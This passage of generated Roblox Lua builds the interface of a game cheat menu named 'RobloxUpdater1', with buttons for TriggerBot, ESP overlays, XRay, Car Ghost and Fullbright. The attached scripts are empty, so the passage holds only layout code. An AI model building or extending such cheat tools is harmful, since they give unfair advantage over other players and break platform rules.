UI["201"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["201"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["201"]["BackgroundTransparency"] = 1
UI["201"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["201"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["201"]["Text"] = [[shoots when you aim at a player]]
UI["201"]["Name"] = [[TextLabel 1]]
UI["201"]["Position"] = UDim2.new(0, 0, 1.07083, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.TriggerBot.UIStroke \\ --
UI["202"] = Instance.new("UIStroke", UI["200"])
UI["202"]["Transparency"] = 0.63
UI["202"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["202"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.TriggerBot.UICorner \\ --
UI["203"] = Instance.new("UICorner", UI["200"])
UI["203"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.TriggerBot.UIGradient \\ --
UI["204"] = Instance.new("UIGradient", UI["200"])
UI["204"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.TriggerBot.LocalScript \\ --
UI["205"] = Instance.new("LocalScript", UI["200"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.TriggerBot.animation \\ --
UI["206"] = Instance.new("LocalScript", UI["200"])
UI["206"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS \\ --
UI["207"] = Instance.new("Frame", UI["e"])
UI["207"]["Visible"] = false
UI["207"]["BorderSizePixel"] = 0
UI["207"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["207"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["207"]["Position"] = UDim2.new(0.2262, 0, 0.15519, 0)
UI["207"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["207"]["Name"] = [[VISUALS]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.UICorner \\ --
UI["208"] = Instance.new("UICorner", UI["207"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.Underline \\ --
UI["209"] = Instance.new("Frame", UI["207"])
UI["209"]["BorderSizePixel"] = 0
UI["209"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["209"]["Size"] = UDim2.new(0, 3, 0, -199)
UI["209"]["Position"] = UDim2.new(0.4955, 0, 0.93887, 0)
UI["209"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["209"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ESP-Controller \\ --
UI["20a"] = Instance.new("LocalScript", UI["207"])
UI["20a"]["Name"] = [[ESP-Controller]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.UIGradient \\ --
UI["20b"] = Instance.new("UIGradient", UI["207"])
UI["20b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame \\ --
UI["20c"] = Instance.new("ScrollingFrame", UI["207"])
UI["20c"]["Active"] = true
UI["20c"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["20c"]["BorderSizePixel"] = 0
UI["20c"]["CanvasSize"] = UDim2.new(0, 0, 1.6, 0)
UI["20c"]["AutoLocalize"] = false
UI["20c"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["20c"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["20c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["20c"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["20c"]["Size"] = UDim2.new(0, 213, 0, 199)
UI["20c"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["20c"]["Position"] = UDim2.new(0.01351, 0, 0.17933, 0)
UI["20c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["20c"]["ScrollBarThickness"] = 5
UI["20c"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.DistanceToggleButton \\ --
UI["20d"] = Instance.new("TextButton", UI["20c"])
UI["20d"]["BorderSizePixel"] = 0
UI["20d"]["TextSize"] = 31
UI["20d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["20d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["20d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["20d"]["ZIndex"] = 3
UI["20d"]["Size"] = UDim2.new(0, 196, 0, 50)
UI["20d"]["BackgroundTransparency"] = 0.85
UI["20d"]["Name"] = [[DistanceToggleButton]]
UI["20d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["20d"]["Text"] = [[Distanz: OFF]]
UI["20d"]["Position"] = UDim2.new(0.0262, 0, 0.02423, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.DistanceToggleButton.UICorner \\ --
UI["20e"] = Instance.new("UICorner", UI["20d"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.DistanceToggleButton.UIGradient \\ --
UI["20f"] = Instance.new("UIGradient", UI["20d"])
UI["20f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.DistanceToggleButton.UIStroke \\ --
UI["210"] = Instance.new("UIStroke", UI["20d"])
UI["210"]["Transparency"] = 0.63
UI["210"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["210"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.HealthBarToggleButton \\ --
UI["211"] = Instance.new("TextButton", UI["20c"])
UI["211"]["BorderSizePixel"] = 0
UI["211"]["TextSize"] = 31
UI["211"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["211"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["211"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["211"]["ZIndex"] = 3
UI["211"]["Size"] = UDim2.new(0, 196, 0, 50)
UI["211"]["BackgroundTransparency"] = 0.85
UI["211"]["Name"] = [[HealthBarToggleButton]]
UI["211"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["211"]["Text"] = [[Health Bar: OFF]]
UI["211"]["Position"] = UDim2.new(0.02677, 0, 0.28347, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.HealthBarToggleButton.UICorner \\ --
UI["212"] = Instance.new("UICorner", UI["211"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.HealthBarToggleButton.UIGradient \\ --
UI["213"] = Instance.new("UIGradient", UI["211"])
UI["213"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.HealthBarToggleButton.UIStroke \\ --
UI["214"] = Instance.new("UIStroke", UI["211"])
UI["214"]["Transparency"] = 0.63
UI["214"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["214"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.JobToggleButton \\ --
UI["215"] = Instance.new("TextButton", UI["20c"])
UI["215"]["BorderSizePixel"] = 0
UI["215"]["TextSize"] = 31
UI["215"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["215"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["215"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["215"]["ZIndex"] = 3
UI["215"]["Size"] = UDim2.new(0, 197, 0, 50)
UI["215"]["BackgroundTransparency"] = 0.85
UI["215"]["Name"] = [[JobToggleButton]]
UI["215"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["215"]["Text"] = [[Job: OFF]]
UI["215"]["Position"] = UDim2.new(0.02605, 0, 0.53435, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.JobToggleButton.UICorner \\ --
UI["216"] = Instance.new("UICorner", UI["215"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.JobToggleButton.UIGradient \\ --
UI["217"] = Instance.new("UIGradient", UI["215"])
UI["217"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.JobToggleButton.UIStroke \\ --
UI["218"] = Instance.new("UIStroke", UI["215"])
UI["218"]["Transparency"] = 0.63
UI["218"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["218"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.UserToggleButton \\ --
UI["219"] = Instance.new("TextButton", UI["20c"])
UI["219"]["BorderSizePixel"] = 0
UI["219"]["TextSize"] = 31
UI["219"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["219"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["219"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["219"]["ZIndex"] = 3
UI["219"]["Size"] = UDim2.new(0, 196, 0, 50)
UI["219"]["BackgroundTransparency"] = 0.85
UI["219"]["Name"] = [[UserToggleButton]]
UI["219"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["219"]["Text"] = [[User: OFF]]
UI["219"]["Position"] = UDim2.new(0.02446, 0, 0.40855, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.UserToggleButton.UICorner \\ --
UI["21a"] = Instance.new("UICorner", UI["219"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.UserToggleButton.UIGradient \\ --
UI["21b"] = Instance.new("UIGradient", UI["219"])
UI["21b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.UserToggleButton.UIStroke \\ --
UI["21c"] = Instance.new("UIStroke", UI["219"])
UI["21c"]["Transparency"] = 0.63
UI["21c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["21c"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.NameToggleButton \\ --
UI["21d"] = Instance.new("TextButton", UI["20c"])
UI["21d"]["BorderSizePixel"] = 0
UI["21d"]["TextSize"] = 31
UI["21d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["21d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["21d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["21d"]["ZIndex"] = 3
UI["21d"]["Size"] = UDim2.new(0, 196, 0, 50)
UI["21d"]["BackgroundTransparency"] = 0.85
UI["21d"]["Name"] = [[NameToggleButton]]
UI["21d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["21d"]["Text"] = [[Name: OFF]]
UI["21d"]["Position"] = UDim2.new(0.02752, 0, 0.15073, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.NameToggleButton.UICorner \\ --
UI["21e"] = Instance.new("UICorner", UI["21d"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.NameToggleButton.UIGradient \\ --
UI["21f"] = Instance.new("UIGradient", UI["21d"])
UI["21f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.NameToggleButton.UIStroke \\ --
UI["220"] = Instance.new("UIStroke", UI["21d"])
UI["220"]["Transparency"] = 0.63
UI["220"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["220"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.WantedToggleButton \\ --
UI["221"] = Instance.new("TextButton", UI["20c"])
UI["221"]["BorderSizePixel"] = 0
UI["221"]["TextSize"] = 31
UI["221"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["221"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["221"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["221"]["ZIndex"] = 3
UI["221"]["Size"] = UDim2.new(0, 196, 0, 50)
UI["221"]["BackgroundTransparency"] = 0.85
UI["221"]["Name"] = [[WantedToggleButton]]
UI["221"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["221"]["Text"] = [[Wanted: OFF]]
UI["221"]["Position"] = UDim2.new(0.02034, 0, 0.65806, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.WantedToggleButton.UICorner \\ --
UI["222"] = Instance.new("UICorner", UI["221"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.WantedToggleButton.UIGradient \\ --
UI["223"] = Instance.new("UIGradient", UI["221"])
UI["223"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.WantedToggleButton.UIStroke \\ --
UI["224"] = Instance.new("UIStroke", UI["221"])
UI["224"]["Transparency"] = 0.63
UI["224"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["224"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.UIListLayout \\ --
UI["225"] = Instance.new("UIListLayout", UI["20c"])
UI["225"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["225"]["Padding"] = UDim.new(0, 20)
UI["225"]["SortOrder"] = Enum.SortOrder.LayoutOrder

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame.UIPadding \\ --
UI["226"] = Instance.new("UIPadding", UI["20c"])
UI["226"]["PaddingTop"] = UDim.new(0, 7)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2 \\ --
UI["227"] = Instance.new("ScrollingFrame", UI["207"])
UI["227"]["Active"] = true
UI["227"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["227"]["BorderSizePixel"] = 0
UI["227"]["CanvasSize"] = UDim2.new(0, 0, 1, 0)
UI["227"]["AutoLocalize"] = false
UI["227"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["227"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["227"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["227"]["Name"] = [[ScrollingFrame2]]
UI["227"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["227"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY
UI["227"]["Size"] = UDim2.new(0, 215, 0, 198)
UI["227"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["227"]["Position"] = UDim2.new(0.50225, 0, 0.17933, 0)
UI["227"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["227"]["ScrollBarThickness"] = 5
UI["227"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Blurred \\ --
UI["228"] = Instance.new("TextButton", UI["227"])
UI["228"]["BorderSizePixel"] = 0
UI["228"]["TextSize"] = 31
UI["228"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["228"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["228"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["228"]["ZIndex"] = 3
UI["228"]["Size"] = UDim2.new(0, 196, 0, 50)
UI["228"]["BackgroundTransparency"] = 0.85
UI["228"]["Name"] = [[Blurred]]
UI["228"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["228"]["Text"] = [[Blurred: OFF]]
UI["228"]["Position"] = UDim2.new(0.03039, 0, 1.41269, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Blurred.UICorner \\ --
UI["229"] = Instance.new("UICorner", UI["228"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Blurred.LocalScript \\ --
UI["22a"] = Instance.new("LocalScript", UI["228"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Blurred.UIGradient \\ --
UI["22b"] = Instance.new("UIGradient", UI["228"])
UI["22b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Blurred.UIStroke \\ --
UI["22c"] = Instance.new("UIStroke", UI["228"])
UI["22c"]["Transparency"] = 0.63
UI["22c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["22c"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.LowGrafik \\ --
UI["22d"] = Instance.new("TextButton", UI["227"])
UI["22d"]["BorderSizePixel"] = 0
UI["22d"]["TextSize"] = 31
UI["22d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["22d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["22d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["22d"]["ZIndex"] = 3
UI["22d"]["Size"] = UDim2.new(0, 196, 0, 50)
UI["22d"]["BackgroundTransparency"] = 0.85
UI["22d"]["Name"] = [[LowGrafik]]
UI["22d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["22d"]["Text"] = [[FPS Booster]]
UI["22d"]["Position"] = UDim2.new(0.02944, 0, 0.03334, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.LowGrafik.UICorner \\ --
UI["22e"] = Instance.new("UICorner", UI["22d"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.LowGrafik.LocalScript \\ --
UI["22f"] = Instance.new("LocalScript", UI["22d"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.LowGrafik.UIGradient \\ --
UI["230"] = Instance.new("UIGradient", UI["22d"])
UI["230"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.LowGrafik.UIStroke \\ --
UI["231"] = Instance.new("UIStroke", UI["22d"])
UI["231"]["Transparency"] = 0.63
UI["231"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["231"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Xray \\ --
UI["232"] = Instance.new("TextButton", UI["227"])
UI["232"]["BorderSizePixel"] = 0
UI["232"]["TextSize"] = 31
UI["232"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["232"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["232"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["232"]["ZIndex"] = 3
UI["232"]["Size"] = UDim2.new(0, 196, 0, 50)
UI["232"]["BackgroundTransparency"] = 0.85
UI["232"]["Name"] = [[Xray]]
UI["232"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["232"]["Text"] = [[XRay: OFF]]
UI["232"]["Position"] = UDim2.new(0.02698, 0, 1.70222, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Xray.UICorner \\ --
UI["233"] = Instance.new("UICorner", UI["232"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Xray.LocalScript \\ --
UI["234"] = Instance.new("LocalScript", UI["232"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Xray.UIGradient \\ --
UI["235"] = Instance.new("UIGradient", UI["232"])
UI["235"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Xray.UIStroke \\ --
UI["236"] = Instance.new("UIStroke", UI["232"])
UI["236"]["Transparency"] = 0.63
UI["236"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["236"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.SkinGohst \\ --
UI["237"] = Instance.new("TextButton", UI["227"])
UI["237"]["BorderSizePixel"] = 0
UI["237"]["TextSize"] = 31
UI["237"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["237"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["237"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["237"]["ZIndex"] = 3
UI["237"]["Size"] = UDim2.new(0, 196, 0, 50)
UI["237"]["BackgroundTransparency"] = 0.85
UI["237"]["Name"] = [[SkinGohst]]
UI["237"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["237"]["Text"] = [[Skin Ghost]]
UI["237"]["Position"] = UDim2.new(0.02809, 0, 1.08857, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.SkinGohst.UICorner \\ --
UI["238"] = Instance.new("UICorner", UI["237"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.SkinGohst.LocalScript \\ --
UI["239"] = Instance.new("LocalScript", UI["237"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.SkinGohst.UIGradient \\ --
UI["23a"] = Instance.new("UIGradient", UI["237"])
UI["23a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.SkinGohst.UIStroke \\ --
UI["23b"] = Instance.new("UIStroke", UI["237"])
UI["23b"]["Transparency"] = 0.63
UI["23b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["23b"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.CarGohst \\ --
UI["23c"] = Instance.new("TextButton", UI["227"])
UI["23c"]["BorderSizePixel"] = 0
UI["23c"]["TextSize"] = 31
UI["23c"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["23c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["23c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["23c"]["ZIndex"] = 3
UI["23c"]["Size"] = UDim2.new(0, 196, 0, 50)
UI["23c"]["BackgroundTransparency"] = 0.85
UI["23c"]["Name"] = [[CarGohst]]
UI["23c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["23c"]["Text"] = [[Car Ghost]]
UI["23c"]["Position"] = UDim2.new(0.0241, 0, 0.70435, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.CarGohst.UICorner \\ --
UI["23d"] = Instance.new("UICorner", UI["23c"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.CarGohst.LocalScript \\ --
UI["23e"] = Instance.new("LocalScript", UI["23c"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.CarGohst.UIGradient \\ --
UI["23f"] = Instance.new("UIGradient", UI["23c"])
UI["23f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.CarGohst.UIStroke \\ --
UI["240"] = Instance.new("UIStroke", UI["23c"])
UI["240"]["Transparency"] = 0.63
UI["240"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["240"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Fullbright \\ --
UI["241"] = Instance.new("TextButton", UI["227"])
UI["241"]["BorderSizePixel"] = 0
UI["241"]["TextSize"] = 31
UI["241"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["241"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["241"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["241"]["ZIndex"] = 3
UI["241"]["Size"] = UDim2.new(0, 196, 0, 50)
UI["241"]["BackgroundTransparency"] = 0.85
UI["241"]["Name"] = [[Fullbright]]
UI["241"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["241"]["Text"] = [[Fullbright]]
UI["241"]["Position"] = UDim2.new(0.02235, 0, 0.39949, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Fullbright.UICorner \\ --
UI["242"] = Instance.new("UICorner", UI["241"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Fullbright.LocalScript \\ --
UI["243"] = Instance.new("LocalScript", UI["241"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Fullbright.UIGradient \\ --
UI["244"] = Instance.new("UIGradient", UI["241"])
UI["244"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Fullbright.UIStroke \\ --
UI["245"] = Instance.new("UIStroke", UI["241"])
UI["245"]["Transparency"] = 0.63
UI["245"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["245"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.UIListLayout \\ --
UI["246"] = Instance.new("UIListLayout", UI["227"])
UI["246"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["246"]["Padding"] = UDim.new(0, 20)
UI["246"]["SortOrder"] = Enum.SortOrder.LayoutOrder

-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.UIPadding \\ --
UI["247"] = Instance.new("UIPadding", UI["227"])
UI["247"]["PaddingTop"] = UDim.new(0, 7)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats \\ --
UI["248"] = Instance.new("Frame", UI["e"])
UI["248"]["Visible"] = false
UI["248"]["BorderSizePixel"] = 0
UI["248"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["248"]["Size"] = UDim2.new(0, 444, 0, 261)
UI["248"]["Position"] = UDim2.new(0.22573, 0, 0.15519, 0)
UI["248"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
